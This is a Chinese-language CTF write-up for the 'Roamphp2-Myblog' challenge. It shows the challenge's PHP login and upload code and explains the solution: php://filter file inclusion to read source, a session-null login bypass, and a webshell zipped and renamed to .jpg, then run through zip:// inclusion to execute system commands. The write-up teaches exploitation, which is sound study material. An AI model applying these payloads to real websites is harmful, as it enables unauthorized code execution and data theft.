# \[极客大挑战 2020]Roamphp2-Myblog

## \[极客大挑战 2020]Roamphp2-Myblog

## 考点

* PHP session登录逻辑漏洞
* 文件上传
* 文件上传+zip伪协议getshell

## wp

链接像文件包含

`http://caac6260-fed6-4ec8-9774-2bd683f115f2.node4.buuoj.cn:81/index.php?page=home`

`http://caac6260-fed6-4ec8-9774-2bd683f115f2.node4.buuoj.cn:81/index.php?page=php://filter/read=convert.base64-encode/resource=home`

可以得到源码，只能读`login.php`，`home.php`，`secret.php`和`admin/user.php`

home.php全是HTML，只剩下登录的逻辑了，代码比较少，简化一下如下

```php
<?php
// login.php
$secret_seed = mt_rand();
mt_srand($secret_seed);
$_SESSION['password'] = mt_rand();

// admin/user.php
error_reporting(0);
session_start();
$logined = false;
if (isset($_POST['username']) and isset($_POST['password'])){
	if ($_POST['username'] === "Longlone" and $_POST['password'] == $_SESSION['password']){  // No one knows my password, including myself
		$logined = true;
		$_SESSION['status'] = $logined;
	}
}
if ($logined === false && !isset($_SESSION['status']) || $_SESSION['status'] !== true){
	die();
}
?>
```

从login.php登录，POST数据到admin/user.php进行校验。<mark style="color:blue;">在校验时是比较输入的password与session中存储的password是否一致，但是如果没有sessionid，那么</mark><mark style="color:blue;">`$_SESSION['password']`</mark><mark style="color:blue;">的结果就是</mark><mark style="color:blue;">`NULL`</mark><mark style="color:blue;">，登录的时候密码不填就可以登录了。</mark>

burp抓包把Cookie和password的值删掉，在Forward即可

![](<../../.gitbook/assets/image (33).png>)

登录之后就是文件上传

{% code title="admin/user.php" %}
```php
<?php
if (isset($_FILES['Files']) and $_SESSION['status'] === true) {
    $tmp_file = $_FILES['Files']['name'];
    $tmp_path = $_FILES['Files']['tmp_name'];
    if (($extension = pathinfo($tmp_file) ['extension']) != "") {
        $allows = array('gif', 'jpeg', 'jpg', 'png');
        if (in_array($extension, $allows, true) and in_array($_FILES['Files']['type'], array_map(function ($ext) {
            return 'image/' . $ext;
        }, $allows), true)) {
            $upload_name = sha1(md5(uniqid(microtime(true), true))) . '.' . $extension;
            move_uploaded_file($tmp_path, "assets/img/upload/" . $upload_name);
            echo "<script>alert('Update image -> assets/img/upload/${upload_name}') </script>";
        } else {
            echo "<script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') </script>";
        }
    }
}
?>
```
{% endcode %}

前有文件包含，但是只能包含`.php`，后有文件上传，但是只能上传图片。这样就只剩下伪协议了，phar和zip

写一个一句话木马123.php，然后压缩成123.zip，改名为123.jpg，再上传，得到路径`assets/img/upload/d522c95c5a225a8e313f30883076d6e34688ec6d.jpg`

然后使用zip://伪协议`?page=zip://assets/img/upload/d522c95c5a225a8e313f30883076d6e34688ec6d.jpg%23123`

POST `cmd=system("cat /flllaggggggggg_isssssssssss_heeeeeeeeeere");`

